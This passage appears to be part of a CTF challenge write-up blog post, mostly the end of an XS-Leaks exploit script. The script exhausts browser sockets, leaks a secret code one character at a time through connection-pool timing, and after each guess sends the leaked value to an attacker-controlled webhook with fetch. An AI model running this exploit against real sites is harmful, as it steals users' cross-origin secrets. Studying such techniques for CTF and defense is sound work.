+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">exhaust_sockets</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.1 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">1000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.2 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">11000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.3 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">21000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.4 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">31000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.5 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">41000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">async</span> () =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">result1</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">leak_char</span>();
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`char n.6 guess: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;SUCCESS&#39;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">leaked_code</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">result1</span>[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Leaked code so far </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">leaked_code</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#e6db74">&#39;INFO&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`{{ webhook }}?token=</span><span style="color:#e6db74">${</span>encodeURIComponent(<span style="color:#a6e22e">leaked_code</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
+</span></span><span style="display:flex;"><span>            });
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">51000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">main</span>();
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>I had a great time creating and solving this challenge! Unfortunately, out of the three solvers, only one solved it as intended. :/</p>
+<p>The exploit could be much faster than it currently is. I also want to thank @simonedimaria for helping me with this research and keeping me sane. I’ll probably write another blog post about other findings.</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p><a href="https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/">https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
 </div>
     </article>
   </main>
